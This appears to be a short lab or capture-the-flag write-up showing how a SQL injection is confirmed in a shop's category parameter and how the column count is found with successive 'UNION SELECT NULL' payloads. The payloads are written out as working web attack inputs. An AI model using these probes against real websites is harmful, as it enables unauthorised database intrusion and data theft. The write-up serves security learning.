![image](./ss/UNION-determining-the-number-of-columns1)

Straight away we can see 3 possible section vulnerable to sqli. Starting with two more likely candidates, first we will try the 'categories'. 

After clicking a category appending `'` to the url will cause `Internal Server Error`. And now we know for sure that there's a SQLi 

we need to concat our payload at the end of the string.

- Will give `Internal Server Error`
```
' UNION SELECT NULL--
```

- Will give `Internal Server Error`
```
' UNION SELECT NULL,NULL--
```

- This payload will work
```
' UNION SELECT NULL,NULL,NULL--
```

![image](./ss/UNION-determining-the-number-of-columns2)
